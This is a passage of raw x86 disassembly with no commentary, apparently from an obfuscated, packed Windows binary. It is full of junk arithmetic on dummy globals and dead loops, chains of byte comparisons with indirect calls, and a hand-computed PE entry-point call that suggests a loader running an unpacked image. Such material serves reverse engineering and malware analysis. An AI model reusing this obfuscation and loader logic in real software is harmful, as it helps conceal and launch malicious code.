  41c331:	mov    ebx,DWORD PTR ds:0x42af49
  41c337:	sub    esi,ebx
  41c339:	sub    esi,DWORD PTR [esi+ebx*1]
  41c33c:	lea    eax,[esp+0x30]
  41c340:	mov    DWORD PTR [esp+0x28],eax
  41c344:	sub    DWORD PTR ds:0x426ea9,0x492f
  41c34e:	mov    eax,ds:0x4262c9
  41c353:	mov    edx,DWORD PTR ds:0x426ef9
  41c359:	sbb    DWORD PTR ds:0x426f05,edx
  41c35f:	mov    eax,DWORD PTR [eax+0x1c8]
  41c365:	mov    DWORD PTR ds:0x426f29,0x788d
  41c36f:	mov    eax,DWORD PTR [eax]
  41c371:	mov    edx,DWORD PTR [esp+0x28]
  41c375:	and    DWORD PTR ds:0x426efd,0x0
  41c37f:	jmp    0x41c393
  41c384:	xor    esi,esi
  41c386:	xor    esi,DWORD PTR ds:0x426efd
  41c38c:	inc    esi
  41c38d:	mov    DWORD PTR ds:0x426efd,esi
  41c393:	cmp    DWORD PTR ds:0x426efd,0x1a
  41c39a:	jae    0x41c3cb
  41c3a0:	cmp    DWORD PTR ds:0x426efd,0x1c
  41c3a7:	jge    0x41c3cb
  41c3ad:	jmp    0x41c3c6
  41c3b2:	push   DWORD PTR [ebp-0xc]
  41c3b5:	push   0x4c83
  41c3ba:	push   DWORD PTR [ebp-0x14]
  41c3bd:	push   DWORD PTR [ebp-0x1c]
  41c3c0:	call   DWORD PTR ds:0x430a4c
  41c3c6:	jmp    0x41c384
  41c3cb:	mov    esi,0x75108b3
  41c3d0:	and    DWORD PTR ds:0x426e81,0x1564
  41c3da:	xor    eax,esi
  41c3dc:	mov    ebx,0x3272fa
  41c3e1:	add    eax,ebx
  41c3e3:	mov    DWORD PTR [edx],eax
  41c3e5:	mov    DWORD PTR ds:0x426ea1,0x7a67
  41c3ef:	mov    eax,ds:0x426d99
  41c3f4:	mov    DWORD PTR ds:0x426f1d,0x65da
  41c3fe:	cmp    eax,0x455dedfa
  41c403:	mov    DWORD PTR ds:0x426ea9,0x55fc
  41c40d:	jne    0x41c4f5
  41c413:	and    DWORD PTR ds:0x426ef5,0x0
  41c41d:	mov    eax,ds:0x426ef5
  41c422:	inc    eax
  41c423:	mov    ds:0x426ef5,eax
  41c428:	cmp    DWORD PTR ds:0x426ef5,0xd
  41c42f:	jl     0x41c479
  41c435:	jmp    0x41c454
  41c43a:	push   0x59de
  41c43f:	push   0x39ed
  41c444:	push   0x1b7c
  41c449:	push   0x44aa
  41c44e:	call   DWORD PTR ds:0x430a1c
  41c454:	cmp    DWORD PTR ds:0x426ef5,0xc
  41c45b:	jne    0x41c46c
  41c461:	mov    eax,ds:0x426ef5
  41c466:	inc    eax
  41c467:	mov    ds:0x426ef5,eax
  41c46c:	cmp    DWORD PTR ds:0x426ef5,0x1f
  41c473:	jb     0x41c41d
  41c479:	mov    eax,DWORD PTR [esp+0x10]
  41c47d:	xor    edx,DWORD PTR ds:0x426ecd
  41c483:	mov    edx,DWORD PTR ds:0x4262c9
  41c489:	mov    edx,DWORD PTR [edx+0x198]
  41c48f:	add    DWORD PTR ds:0x426ec5,0x6b2
  41c499:	xor    eax,esi
  41c49b:	adc    DWORD PTR ds:0x426f25,0x426ef9
  41c4a5:	add    eax,ebx
  41c4a7:	and    DWORD PTR ds:0x426e85,0x426f15
  41c4b1:	mov    DWORD PTR [edx],eax
  41c4b3:	mov    eax,DWORD PTR [esp+0x10]
  41c4b7:	sub    DWORD PTR ds:0x426ec9,0x4e94
  41c4c1:	xor    eax,esi
  41c4c3:	add    eax,ebx
  41c4c5:	adc    DWORD PTR ds:0x426e81,0x426e91
  41c4cf:	mov    ds:0x426d99,eax
  41c4d4:	mov    eax,DWORD PTR [esp+0x10]
  41c4d8:	adc    DWORD PTR ds:0x426eed,0x426ef9
  41c4e2:	xor    eax,esi
  41c4e4:	add    eax,ebx
  41c4e6:	sub    DWORD PTR ds:0x426ea9,0x426e85
  41c4f0:	mov    ds:0x4263c1,eax
  41c4f5:	mov    eax,ds:0x4262c9
  41c4fa:	sbb    DWORD PTR ds:0x426f05,0x67a3
  41c504:	mov    eax,DWORD PTR [eax+0x18c]
  41c50a:	adc    DWORD PTR ds:0x426e91,0x180f
  41c514:	mov    eax,DWORD PTR [eax]
  41c516:	sbb    DWORD PTR ds:0x426eb1,0x4112
  41c520:	mov    DWORD PTR [esp+0x48],eax
  41c524:	adc    DWORD PTR ds:0x426eb9,edi
  41c52a:	mov    eax,0xf89c85b9
  41c52f:	mov    DWORD PTR [esp+0x38],eax
  41c533:	inc    DWORD PTR ds:0x426e8d
  41c539:	mov    DWORD PTR [esp+0x38],eax
  41c53d:	xor    DWORD PTR ds:0x426f11,0x441e
  41c547:	mov    DWORD PTR [esp+0x38],eax
  41c54b:	mov    DWORD PTR [esp+0x38],ecx
  41c54f:	neg    DWORD PTR ds:0x426f25
  41c555:	mov    DWORD PTR [esp+0x28],eax
  41c559:	movzx  eax,WORD PTR ds:0x426ec5
  41c560:	sbb    eax,DWORD PTR ds:0x426ee1
  41c566:	mov    ds:0x426ec5,eax
  41c56b:	mov    DWORD PTR [esp+0x28],0xf89c85bd
  41c573:	sbb    DWORD PTR ds:0x426ef9,0x58a6
  41c57d:	mov    eax,DWORD PTR [esp+0x10]
  41c581:	xor    eax,esi
  41c583:	add    eax,ebx
  41c585:	jmp    0x41c7a3
  41c58a:	mov    DWORD PTR ds:0x426eb5,0x6384
  41c594:	mov    al,ds:0x42647f
  41c599:	mov    DWORD PTR ds:0x426f01,0x6aa0
  41c5a3:	cmp    al,BYTE PTR ds:0x42648a
  41c5a9:	mov    DWORD PTR ds:0x426e85,0x34fb
  41c5b3:	jne    0x41c211
  41c5b9:	mov    DWORD PTR ds:0x426e99,0x7ac4
  41c5c3:	mov    al,ds:0x42649c
  41c5c8:	cmp    al,BYTE PTR ds:0x4264ab
  41c5ce:	mov    DWORD PTR ds:0x426e99,0x679f
  41c5d8:	jne    0x41c211
  41c5de:	push   0x4264b5
  41c5e3:	or     DWORD PTR ds:0x426e99,0x4d97
  41c5ed:	push   0x4264c5
  41c5f2:	call   edi
  41c5f4:	test   eax,eax
  41c5f6:	mov    DWORD PTR ds:0x426ecd,0x4160
  41c600:	je     0x41c211
  41c606:	mov    DWORD PTR ds:0x426ec5,0x29ef
  41c610:	mov    al,ds:0x4264db
  41c615:	cmp    al,BYTE PTR ds:0x4264e6
  41c61b:	jne    0x41c211
  41c621:	mov    al,ds:0x4264f8
  41c626:	mov    DWORD PTR ds:0x426ecd,0x6d7c
  41c630:	cmp    al,BYTE PTR ds:0x426507
  41c636:	mov    DWORD PTR ds:0x426ee5,0x7eb8
  41c640:	jne    0x41c211
  41c646:	sub    DWORD PTR ds:0x426ef9,0x282b
  41c650:	push   0x426511
  41c655:	push   0x426521
  41c65a:	call   edi
  41c65c:	sbb    DWORD PTR ds:0x426edd,0x426e9d
  41c666:	test   eax,eax
  41c668:	mov    DWORD PTR ds:0x426ee9,0x3f4b
  41c672:	je     0x41c211
  41c678:	and    DWORD PTR ds:0x426e91,0x0
  41c682:	xor    eax,eax
  41c684:	xor    eax,DWORD PTR ds:0x426e91
  41c68a:	inc    eax
  41c68b:	mov    ds:0x426e91,eax
  41c690:	cmp    DWORD PTR ds:0x426e91,0x9
  41c697:	ja     0x41c6d0
  41c69d:	jmp    0x41c6a8
  41c6a2:	call   DWORD PTR ds:0x430a20
  41c6a8:	cmp    DWORD PTR ds:0x426e91,0x8
  41c6af:	jne    0x41c6c3
  41c6b5:	xor    eax,eax
  41c6b7:	add    eax,DWORD PTR ds:0x426e91
  41c6bd:	inc    eax
  41c6be:	mov    ds:0x426e91,eax
  41c6c3:	cmp    DWORD PTR ds:0x426e91,0x1a
  41c6ca:	jb     0x41c682
  41c6d0:	mov    eax,DWORD PTR [esp+0x1c]
  41c6d4:	adc    DWORD PTR ds:0x426f01,ecx
  41c6da:	mov    ecx,DWORD PTR [esp+0x28]
  41c6de:	xor    eax,esi
  41c6e0:	lea    eax,[eax+ecx*1+0x3272fa]
  41c6e7:	push   eax
  41c6e8:	xor    eax,DWORD PTR ds:0x426eb1
  41c6ee:	mov    eax,DWORD PTR [esp+0x3c]
  41c6f2:	adc    DWORD PTR ds:0x426ec1,0x19c6
  41c6fc:	xor    eax,esi
  41c6fe:	sbb    DWORD PTR ds:0x426ec5,0x426ea9
  41c708:	lea    eax,[ebp+eax*1+0x327302]
  41c70f:	xor    DWORD PTR ds:0x426ec1,0x34b0
  41c719:	push   eax
  41c71a:	xor    eax,DWORD PTR ds:0x426e99
  41c720:	mov    eax,ds:0x4262c9
  41c725:	adc    DWORD PTR ds:0x426ea5,0x426f09
  41c72f:	push   DWORD PTR [eax+0x1bc]
  41c735:	adc    DWORD PTR ds:0x426f0d,0x426ea5
  41c73f:	call   0x41d27f
  41c744:	mov    eax,DWORD PTR [esp+0x1c]
  41c748:	mov    ecx,DWORD PTR [esp+0x28]
  41c74c:	xor    eax,esi
  41c74e:	and    DWORD PTR ds:0x426e85,0x0
  41c758:	mov    edx,DWORD PTR ds:0x426e85
  41c75e:	inc    edx
  41c75f:	mov    DWORD PTR ds:0x426e85,edx
  41c765:	cmp    DWORD PTR ds:0x426e85,0x22
  41c76c:	jl     0x41c79c
  41c772:	jmp    0x41c78f
  41c777:	push   0x426000
  41c77c:	push   0x29cf
  41c781:	push   0x6715
  41c786:	push   DWORD PTR [ebp-0x18]
  41c789:	call   DWORD PTR ds:0x430a24
  41c78f:	cmp    DWORD PTR ds:0x426e85,0x1b
  41c796:	jb     0x41c758
  41c79c:	lea    eax,[ecx+eax*1+0x3272fa]
  41c7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41c7a7:	mov    edx,DWORD PTR [esp+0x1c]
  41c7ab:	xor    edx,esi
  41c7ad:	sbb    DWORD PTR ds:0x426f29,0x426e8d
  41c7b7:	xor    ecx,esi
  41c7b9:	add    ecx,edx
  41c7bb:	sbb    edx,DWORD PTR ds:0x426f1d
  41c7c1:	mov    edx,DWORD PTR [esp+0x1c]
  41c7c5:	adc    DWORD PTR ds:0x426ef9,0x135a
  41c7cf:	xor    edx,esi
  41c7d1:	mov    DWORD PTR ds:0x426ee5,0x2979
  41c7db:	lea    ecx,[ecx+edx*1+0x9758ee]
  41c7e2:	mov    DWORD PTR ds:0x426f2d,0x689
  41c7ec:	mov    DWORD PTR [esp+0x28],eax
  41c7f0:	cmp    eax,ecx
  41c7f2:	mov    DWORD PTR ds:0x426efd,0x13db
  41c7fc:	jbe    0x41c58a
  41c802:	mov    eax,DWORD PTR [ebp+0xc]
  41c805:	mov    ds:0x42614d,eax
  41c80a:	and    DWORD PTR ds:0x426eb1,0x0
  41c814:	jmp    0x41c824
  41c819:	mov    eax,ds:0x426eb1
  41c81e:	inc    eax
  41c81f:	mov    ds:0x426eb1,eax
  41c824:	cmp    DWORD PTR ds:0x426eb1,0x19
  41c82b:	jae    0x41c851
  41c831:	cmp    DWORD PTR ds:0x426eb1,0x20
  41c838:	jl     0x41c851
  41c83e:	jmp    0x41c84c
  41c843:	push   DWORD PTR [ebp-0xc]
  41c846:	call   DWORD PTR ds:0x430a28
  41c84c:	jmp    0x41c819
  41c851:	mov    eax,DWORD PTR [ebp+0x10]
  41c854:	mov    ds:0x4263a9,eax
  41c859:	mov    ecx,DWORD PTR ds:0x42af51
  41c85f:	mov    eax,ds:0x42af5d
  41c864:	sub    eax,ecx
  41c866:	xor    ecx,DWORD PTR [ecx+eax*1]
  41c869:	mov    eax,ds:0x42614d
  41c86e:	inc    ecx
  41c86f:	mov    ecx,DWORD PTR [esp+0x44]
  41c873:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c87d:	sub    eax,ebx
  41c87f:	sub    DWORD PTR ds:0x426eed,0x426f05
  41c889:	xor    eax,esi
  41c88b:	mov    DWORD PTR [ecx],eax
  41c88d:	mov    DWORD PTR ds:0x426ea1,0x1d16
  41c897:	lea    eax,[esp+0x20]
  41c89b:	mov    DWORD PTR ds:0x426f1d,0x743e
  41c8a5:	mov    DWORD PTR [esp+0x4c],eax
  41c8a9:	mov    DWORD PTR ds:0x426eb5,0x1725
  41c8b3:	lea    eax,[ebp+0x4]
  41c8b6:	mov    DWORD PTR ds:0x426f0d,0x331f
  41c8c0:	mov    DWORD PTR [esp+0x20],eax
  41c8c4:	mov    DWORD PTR ds:0x426ea1,0x4fd1
  41c8ce:	mov    al,ds:0x426537
  41c8d3:	cmp    al,BYTE PTR ds:0x426542
  41c8d9:	jne    0x41c211
  41c8df:	mov    al,ds:0x426554
  41c8e4:	mov    DWORD PTR ds:0x426e99,0x22c3
  41c8ee:	cmp    al,BYTE PTR ds:0x426563
  41c8f4:	mov    DWORD PTR ds:0x426f21,0x5c30
  41c8fe:	jne    0x41c211
  41c904:	sub    DWORD PTR ds:0x426eb5,0x53da
  41c90e:	push   0x42656d
  41c913:	sbb    DWORD PTR ds:0x426f0d,0x426f15
  41c91d:	push   0x42657d
  41c922:	sbb    DWORD PTR ds:0x426e81,0x426e95
  41c92c:	call   edi
  41c92e:	test   eax,eax
  41c930:	mov    DWORD PTR ds:0x426f09,0x3f7d
  41c93a:	je     0x41c211
  41c940:	mov    al,ds:0x426593
  41c945:	mov    DWORD PTR ds:0x426f09,0x7a71
  41c94f:	cmp    al,BYTE PTR ds:0x42659e
  41c955:	mov    DWORD PTR ds:0x426f21,0x448e
  41c95f:	jne    0x41c211
  41c965:	mov    al,ds:0x4265b0
  41c96a:	cmp    al,BYTE PTR ds:0x4265bf
  41c970:	jne    0x41c211
  41c976:	push   0x4265c9
  41c97b:	add    DWORD PTR ds:0x426eb9,0x4508
  41c985:	push   0x4265d9
  41c98a:	call   edi
  41c98c:	test   eax,eax
  41c98e:	je     0x41c211
  41c994:	mov    DWORD PTR ds:0x426ed1,0x4635
  41c99e:	mov    al,ds:0x4265ef
  41c9a3:	mov    DWORD PTR ds:0x426f11,0x2d29
  41c9ad:	cmp    al,BYTE PTR ds:0x4265fa
  41c9b3:	mov    DWORD PTR ds:0x426f1d,0x5285
  41c9bd:	jne    0x41c211
  41c9c3:	mov    DWORD PTR ds:0x426ecd,0x17c5
  41c9cd:	mov    al,ds:0x42660c
  41c9d2:	mov    DWORD PTR ds:0x426ecd,0x1f4b
  41c9dc:	cmp    al,BYTE PTR ds:0x42661b
  41c9e2:	jne    0x41c211
  41c9e8:	push   0x426625
  41c9ed:	adc    DWORD PTR ds:0x426ef1,0x426ee5
  41c9f7:	push   0x426635
  41c9fc:	call   edi
  41c9fe:	adc    DWORD PTR ds:0x426edd,0x72d
  41ca08:	test   eax,eax
  41ca0a:	je     0x41c211
  41ca10:	mov    DWORD PTR ds:0x426ed9,0x3296
  41ca1a:	mov    al,ds:0x42664b
  41ca1f:	mov    DWORD PTR ds:0x426e91,0x9e5
  41ca29:	cmp    al,BYTE PTR ds:0x426656
  41ca2f:	mov    DWORD PTR ds:0x426ee1,0x4731
  41ca39:	jne    0x41c211
  41ca3f:	mov    al,ds:0x426668
  41ca44:	cmp    al,BYTE PTR ds:0x426677
  41ca4a:	jne    0x41c211
  41ca50:	xor    DWORD PTR ds:0x426e85,0x78df
  41ca5a:	push   0x426681
  41ca5f:	push   0x426691
  41ca64:	call   edi
  41ca66:	test   eax,eax
  41ca68:	je     0x41c211
  41ca6e:	mov    DWORD PTR ds:0x426efd,0x48d1
  41ca78:	mov    al,ds:0x4266a7
  41ca7d:	mov    DWORD PTR ds:0x426eb1,0x58ba
  41ca87:	cmp    al,BYTE PTR ds:0x4266b2
  41ca8d:	jne    0x41c211
  41ca93:	mov    al,ds:0x4266c4
  41ca98:	mov    DWORD PTR ds:0x426ea9,0x5172
  41caa2:	cmp    al,BYTE PTR ds:0x4266d3
  41caa8:	mov    DWORD PTR ds:0x426ecd,0x25dc
  41cab2:	jne    0x41c211
  41cab8:	add    DWORD PTR ds:0x426ef5,0x426ea9
  41cac2:	push   0x4266dd
  41cac7:	mov    DWORD PTR ds:0x426f1d,0x534b
  41cad1:	push   0x4266ed
  41cad6:	xor    DWORD PTR ds:0x426e8d,0x426e89
  41cae0:	call   edi
  41cae2:	test   eax,eax
  41cae4:	mov    DWORD PTR ds:0x426f09,0x17e9
  41caee:	je     0x41c211
  41caf4:	mov    DWORD PTR ds:0x426f15,0x546d
  41cafe:	mov    al,ds:0x426703
  41cb03:	mov    DWORD PTR ds:0x426ec9,0x6884
  41cb0d:	cmp    al,BYTE PTR ds:0x42670e
  41cb13:	mov    DWORD PTR ds:0x426e95,0x724e
  41cb1d:	jne    0x41c211
  41cb23:	mov    DWORD PTR ds:0x426eb1,0x7b3e
  41cb2d:	mov    al,ds:0x426720
  41cb32:	mov    DWORD PTR ds:0x426ea9,0xb8a
  41cb3c:	cmp    al,BYTE PTR ds:0x42672f
  41cb42:	mov    DWORD PTR ds:0x426ea5,0xfff
  41cb4c:	jne    0x41c211
  41cb52:	adc    DWORD PTR ds:0x426e81,0x426ed5
  41cb5c:	push   0x426739
  41cb61:	push   0x426749
  41cb66:	call   edi
  41cb68:	mov    DWORD PTR ds:0x426eb1,0x513e
  41cb72:	test   eax,eax
  41cb74:	je     0x41c211
  41cb7a:	mov    al,ds:0x42675f
  41cb7f:	mov    DWORD PTR ds:0x426e8d,0x24d0
  41cb89:	cmp    al,BYTE PTR ds:0x42676a
  41cb8f:	jne    0x41c211
  41cb95:	mov    DWORD PTR ds:0x426eb1,0x7a1a
  41cb9f:	mov    al,ds:0x42677c
  41cba4:	mov    DWORD PTR ds:0x426ef5,0x1244
  41cbae:	cmp    al,BYTE PTR ds:0x42678b
  41cbb4:	mov    DWORD PTR ds:0x426ed1,0x3050
  41cbbe:	jne    0x41c211
  41cbc4:	sub    DWORD PTR ds:0x426ee1,0x426f25
  41cbce:	push   0x426795
  41cbd3:	add    DWORD PTR ds:0x426f11,0x40a8
  41cbdd:	push   0x4267a5
  41cbe2:	sub    DWORD PTR ds:0x426ef9,0x426e9d
  41cbec:	call   edi
  41cbee:	adc    DWORD PTR ds:0x426e99,0x426f0d
  41cbf8:	test   eax,eax
  41cbfa:	je     0x41c211
  41cc00:	mov    al,ds:0x4267bb
  41cc05:	mov    DWORD PTR ds:0x426f05,0xc7b
  41cc0f:	cmp    al,BYTE PTR ds:0x4267c6
  41cc15:	mov    DWORD PTR ds:0x426eb9,0x70f1
  41cc1f:	jne    0x41c211
  41cc25:	mov    al,ds:0x4267d8
  41cc2a:	mov    DWORD PTR ds:0x426f09,0x320
  41cc34:	cmp    al,BYTE PTR ds:0x4267e7
  41cc3a:	mov    DWORD PTR ds:0x426ee1,0xc80
  41cc44:	jne    0x41c211
  41cc4a:	sbb    DWORD PTR ds:0x426e85,0x426ea9
  41cc54:	push   0x4267f1
  41cc59:	adc    DWORD PTR ds:0x426f21,0x426f09
  41cc63:	push   0x426801
  41cc68:	call   edi
  41cc6a:	test   eax,eax
  41cc6c:	mov    DWORD PTR ds:0x426e9d,0x1d82
  41cc76:	je     0x41c211
  41cc7c:	mov    DWORD PTR ds:0x426e8d,0x4c1f
  41cc86:	mov    al,ds:0x426817
  41cc8b:	mov    DWORD PTR ds:0x426ebd,0x2305
  41cc95:	cmp    al,BYTE PTR ds:0x426822
  41cc9b:	mov    DWORD PTR ds:0x426e85,0x52ee
  41cca5:	jne    0x41c211
  41ccab:	mov    DWORD PTR ds:0x426eed,0x1308
  41ccb5:	mov    al,ds:0x426834
  41ccba:	cmp    al,BYTE PTR ds:0x426843
  41ccc0:	mov    DWORD PTR ds:0x426ea9,0x1ac4
  41ccca:	jne    0x41c211
  41ccd0:	push   0x42684d
  41ccd5:	push   0x42685d
  41ccda:	call   edi
  41ccdc:	xor    DWORD PTR ds:0x426eb5,0x537b
  41cce6:	test   eax,eax
  41cce8:	mov    DWORD PTR ds:0x426f2d,0x4412
  41ccf2:	je     0x41c211
  41ccf8:	mov    al,ds:0x426873
  41ccfd:	mov    DWORD PTR ds:0x426eb1,0x52c5
  41cd07:	cmp    al,BYTE PTR ds:0x42687e
  41cd0d:	mov    DWORD PTR ds:0x426f01,0x16df
  41cd17:	jne    0x41c211
  41cd1d:	mov    DWORD PTR ds:0x426ee1,0xd56
  41cd27:	mov    al,ds:0x426890
  41cd2c:	mov    DWORD PTR ds:0x426ed1,0x624d
  41cd36:	cmp    al,BYTE PTR ds:0x42689f
  41cd3c:	mov    DWORD PTR ds:0x426e95,0x6fa7
  41cd46:	jne    0x41c211
  41cd4c:	push   0x4268a9
  41cd51:	push   0x4268b9
  41cd56:	call   edi
  41cd58:	test   eax,eax
  41cd5a:	je     0x41c211
  41cd60:	mov    al,ds:0x4268cf
  41cd65:	mov    DWORD PTR ds:0x426ea5,0x6b61
  41cd6f:	cmp    al,BYTE PTR ds:0x4268da
  41cd75:	mov    DWORD PTR ds:0x426ef1,0x607d
  41cd7f:	jne    0x41c211
  41cd85:	mov    al,ds:0x4268ec
  41cd8a:	mov    DWORD PTR ds:0x426f11,0x76ce
  41cd94:	cmp    al,BYTE PTR ds:0x4268fb
  41cd9a:	mov    DWORD PTR ds:0x426ea9,0x7be9
  41cda4:	jne    0x41c211
  41cdaa:	push   0x426905
  41cdaf:	xor    DWORD PTR ds:0x426e89,0x5d69
  41cdb9:	push   0x426915
  41cdbe:	call   edi
  41cdc0:	test   eax,eax
  41cdc2:	je     0x41c211
  41cdc8:	mov    al,ds:0x42692b
  41cdcd:	mov    DWORD PTR ds:0x426eed,0x2af5
  41cdd7:	cmp    al,BYTE PTR ds:0x426936
  41cddd:	mov    DWORD PTR ds:0x426ed9,0x56c9
  41cde7:	jne    0x41c211
  41cded:	mov    DWORD PTR ds:0x426f09,0x21f5
  41cdf7:	mov    al,ds:0x426948
  41cdfc:	cmp    al,BYTE PTR ds:0x426957
  41ce02:	jne    0x41c211
  41ce08:	push   0x426961
  41ce0d:	sub    DWORD PTR ds:0x426ef1,0x426f19
  41ce17:	push   0x426971
  41ce1c:	call   edi
  41ce1e:	or     DWORD PTR ds:0x426f11,0x426ea1
  41ce28:	test   eax,eax
  41ce2a:	je     0x41c211
  41ce30:	mov    DWORD PTR ds:0x426f1d,0x33c9
  41ce3a:	mov    al,ds:0x426987
  41ce3f:	cmp    al,BYTE PTR ds:0x426992
  41ce45:	jne    0x41c211
  41ce4b:	mov    al,ds:0x4269a4
  41ce50:	cmp    al,BYTE PTR ds:0x4269b3
  41ce56:	jne    0x41c211
  41ce5c:	push   0x4269bd
  41ce61:	push   0x4269cd
  41ce66:	call   edi
  41ce68:	test   eax,eax
  41ce6a:	je     0x41c211
  41ce70:	mov    al,ds:0x4269e3
  41ce75:	cmp    al,BYTE PTR ds:0x4269ee
  41ce7b:	jne    0x41c211
  41ce81:	mov    al,ds:0x426a00
  41ce86:	cmp    al,BYTE PTR ds:0x426a0f
  41ce8c:	jne    0x41c211
  41ce92:	push   0x426a19
  41ce97:	push   0x426a29
  41ce9c:	call   edi
  41ce9e:	test   eax,eax
  41cea0:	je     0x41c211
  41cea6:	mov    al,ds:0x426a3f
  41ceab:	cmp    al,BYTE PTR ds:0x426a4a
  41ceb1:	jne    0x41c211
  41ceb7:	mov    al,ds:0x426a5c
  41cebc:	cmp    al,BYTE PTR ds:0x426a6b
  41cec2:	jne    0x41c211
  41cec8:	push   0x426a75
  41cecd:	push   0x426a85
  41ced2:	call   edi
  41ced4:	test   eax,eax
  41ced6:	je     0x41c211
  41cedc:	mov    al,ds:0x426a9b
  41cee1:	cmp    al,BYTE PTR ds:0x426aa6
  41cee7:	jne    0x41c211
  41ceed:	mov    al,ds:0x426ab8
  41cef2:	cmp    al,BYTE PTR ds:0x426ac7
  41cef8:	jne    0x41c211
  41cefe:	push   0x426ad1
  41cf03:	push   0x426ae1
  41cf08:	call   edi
  41cf0a:	test   eax,eax
  41cf0c:	je     0x41c211
  41cf12:	mov    al,ds:0x426af7
  41cf17:	cmp    al,BYTE PTR ds:0x426b02
  41cf1d:	jne    0x41c211
  41cf23:	mov    al,ds:0x426b14
  41cf28:	cmp    al,BYTE PTR ds:0x426b23
  41cf2e:	jne    0x41c211
  41cf34:	push   0x426b2d
  41cf39:	push   0x426b3d
  41cf3e:	call   edi
  41cf40:	test   eax,eax
  41cf42:	je     0x41c211
  41cf48:	mov    al,ds:0x426b53
  41cf4d:	cmp    al,BYTE PTR ds:0x426b5e
  41cf53:	jne    0x41c211
  41cf59:	mov    al,ds:0x426b70
  41cf5e:	cmp    al,BYTE PTR ds:0x426b7f
  41cf64:	jne    0x41c211
  41cf6a:	push   0x426b89
  41cf6f:	push   0x426b99
  41cf74:	call   edi
  41cf76:	test   eax,eax
  41cf78:	je     0x41c211
  41cf7e:	mov    al,ds:0x426baf
  41cf83:	cmp    al,BYTE PTR ds:0x426bba
  41cf89:	jne    0x41c211
  41cf8f:	mov    al,ds:0x426bcc
  41cf94:	cmp    al,BYTE PTR ds:0x426bdb
  41cf9a:	jne    0x41c211
  41cfa0:	push   0x426be5
  41cfa5:	push   0x426bf5
  41cfaa:	call   edi
  41cfac:	test   eax,eax
  41cfae:	je     0x41c211
  41cfb4:	mov    al,ds:0x426c0b
  41cfb9:	cmp    al,BYTE PTR ds:0x426c16
  41cfbf:	jne    0x41c211
  41cfc5:	mov    al,ds:0x426c28
  41cfca:	cmp    al,BYTE PTR ds:0x426c37
  41cfd0:	jne    0x41c211
  41cfd6:	push   0x426c41
  41cfdb:	push   0x426c51
  41cfe0:	call   edi
  41cfe2:	test   eax,eax
  41cfe4:	je     0x41c211
  41cfea:	mov    al,ds:0x426c67
  41cfef:	cmp    al,BYTE PTR ds:0x426c72
  41cff5:	jne    0x41c211
  41cffb:	mov    al,ds:0x426c84
  41d000:	cmp    al,BYTE PTR ds:0x426c93
  41d006:	jne    0x41c211
  41d00c:	push   0x426c9d
  41d011:	push   0x426cad
  41d016:	call   edi
  41d018:	test   eax,eax
  41d01a:	je     0x41c211
  41d020:	mov    eax,DWORD PTR [esp+0x34]
  41d024:	cmp    eax,0xf89c85b4
  41d029:	je     0x41d088
  41d02f:	mov    eax,DWORD PTR [esp+0x10]
  41d033:	mov    ecx,DWORD PTR [esp+0x30]
  41d037:	xor    eax,esi
  41d039:	add    eax,ebx
  41d03b:	cmp    eax,ecx
  41d03d:	je     0x41d088
  41d043:	mov    eax,ds:0x4262c9
  41d048:	mov    eax,DWORD PTR [eax+0x194]
  41d04e:	mov    ecx,DWORD PTR [eax]
  41d050:	mov    eax,DWORD PTR [ecx+0x3c]
  41d053:	push   DWORD PTR ds:0x4263a9
  41d059:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41d05d:	push   DWORD PTR ds:0x42614d
  41d063:	add    eax,ecx
  41d065:	mov    ecx,DWORD PTR ds:0x4262c9
  41d06b:	mov    ecx,DWORD PTR [ecx+0x194]
  41d071:	push   DWORD PTR [ecx]
  41d073:	call   eax
  41d075:	mov    ecx,DWORD PTR ds:0x4262c9
  41d07b:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d081:	mov    DWORD PTR [ecx],eax
  41d083:	jmp    0x41d259
  41d088:	mov    eax,DWORD PTR [esp+0x10]
  41d08c:	mov    ecx,DWORD PTR [esp+0x48]
  41d090:	xor    eax,esi
  41d092:	add    eax,ebx
  41d094:	cmp    eax,ecx
  41d096:	jne    0x41d101
  41d09c:	mov    eax,DWORD PTR [esp+0x10]
  41d0a0:	mov    ecx,DWORD PTR ds:0x4262c9
  41d0a6:	mov    ecx,DWORD PTR [ecx+0x198]
  41d0ac:	xor    eax,esi
  41d0ae:	add    eax,ebx
  41d0b0:	cmp    eax,DWORD PTR [ecx]
  41d0b2:	jne    0x41d0da
  41d0b8:	mov    eax,DWORD PTR [esp+0x10]
  41d0bc:	push   0xffffffff
  41d0be:	push   0x70941f8a
  41d0c3:	xor    eax,esi
  41d0c5:	add    eax,ebx
  41d0c7:	push   eax
  41d0c8:	push   0xf89c85b9
  41d0cd:	push   DWORD PTR [esp+0x2c]
  41d0d1:	push   DWORD PTR [esp+0x24]
  41d0d5:	call   0x417355
  41d0da:	push   DWORD PTR [esp+0x1c]
  41d0de:	push   DWORD PTR [esp+0x14]
  41d0e2:	call   0x401000
  41d0e7:	mov    eax,DWORD PTR [esp+0x10]
  41d0eb:	xor    eax,esi
  41d0ed:	add    eax,ebx
  41d0ef:	mov    ds:0x426355,eax
  41d0f4:	mov    eax,DWORD PTR [esp+0x10]
  41d0f8:	xor    eax,esi
  41d0fa:	add    eax,ebx
  41d0fc:	mov    ds:0x42634d,eax
  41d101:	mov    eax,DWORD PTR [esp+0x20]
  41d105:	test   eax,eax
  41d107:	je     0x41d259
  41d10d:	mov    DWORD PTR [esp+0x50],0xf152c3c
  41d115:	mov    DWORD PTR [esp+0x54],0x712edcf
  41d11d:	mov    DWORD PTR [esp+0x58],0x373fc2d
  41d125:	mov    DWORD PTR [esp+0x5c],0x72670add
  41d12d:	call   0x416fa9
  41d132:	mov    eax,DWORD PTR [esp+0x24]
  41d136:	mov    eax,DWORD PTR [esp+0x1c]
  41d13a:	mov    DWORD PTR [esp+0x44],eax
  41d13e:	mov    eax,DWORD PTR [esp+0x10]
  41d142:	mov    DWORD PTR [esp+0x1c],eax
  41d146:	mov    eax,eax
  41d148:	mov    eax,ds:0x4262c9
  41d14d:	mov    ecx,DWORD PTR [eax+0x1c0]
  41d153:	mov    edx,DWORD PTR [ecx]
  41d155:	and    DWORD PTR [esp+0x3c],0x0
  41d15a:	mov    edi,0xfabdbecd
  41d15f:	add    edx,edi
  41d161:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d166:	mov    ecx,0x8a29a147
  41d16b:	xor    edx,ecx
  41d16d:	mov    DWORD PTR [esp+0x28],edx
  41d171:	mov    edx,DWORD PTR [esp+0x3c]
